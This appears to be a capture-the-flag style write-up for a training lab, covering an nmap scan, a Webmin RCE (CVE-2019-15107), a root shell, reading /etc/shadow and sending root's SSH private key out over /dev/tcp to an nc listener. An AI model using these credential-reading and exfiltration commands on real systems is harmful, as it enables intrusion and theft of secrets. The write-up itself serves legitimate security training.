
## Enumeration

scan top **15000** ports.

```sh
sudo nmap -sC -sV --min-rate 4500 --max-rtt-timeout 1500ms -p-,15000- <IP> -oA enum && xsltproc enum.xml -o enum.html
```

After a couple of minutes we have the result of our scan; we can now answer the qeustions.

![](https://cdn.imgchest.com/files/49zc2znrzoy.png)

**How many of the first 15000 ports are open on the target?**
>4
- SSH 22
- HTTP 80
- HTTPS 443
- MiniServ 10000

**What OS does Nmap think is running?**
>CentOs

**Open the IP in your browser -- what site does the server try to redirect you to?**
>https://thomaswreath.thm

after following the instructions we can access the website

![](https://cdn.imgchest.com/files/7ogcbva2zqy.png)

it appears to be a personal website of our friend Thomas, moving on.

**Read through the text on the page. What is Thomas' mobile phone number?**
>+447821548812

![](https://cdn.imgchest.com/files/7w6c2r9kway.png)

**Look back at your service scan results: what server version does Nmap detect as running here?**
> MiniServ 1.890 (Webmin httpd)

Since I couldn't get that format using the full scan I scanned that port only

```sh
sudo nmap -sC -sV -p 10000 thomaswreath.thm
```

**What is the CVE number for this exploit?**
>CVE-2019-15107

Which's an RCE in that version of MiniServ.

## Exploitation
We follow the provided instructions to gain shell access.

### Optional
Stabilising the shell

```sh
# python3 -c 'import pty; pty.spawn("/bin/bash");'
ctrl+z
kali@kali$ stty raw; fg
[root@prod-serv ]# 
```

**Which user was the server running as?**
> root

running `whoami` outputs `root` which is the current user, you can also use `id` should output:
```
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
```

**What is the root user's password hash?**
`$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1`

We can find this by running `cat /etc/shadow` and copy the part after `root:`  and before `::`.

> You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.

**What is the full path to this file?**
>/root/.ssh/id_rsa

it's trivial(also the hint reveals it).

we download the file to our machine, I personally used

target:
```sh
cat id_rsa > /dev/tcp/<IP>/<PORT>
```
*use your machine ip, you can find it through `ip a` usually it's `tun<x>` since you're connecting to a VPN*

attacker:
```
nc -lnvp <PORT> > id_rsa
```

don't forget to `chmod 600 id_rsa` and then you can connect using:
```sh
ssh -i id_rsa root@thomaswreath.thm
```

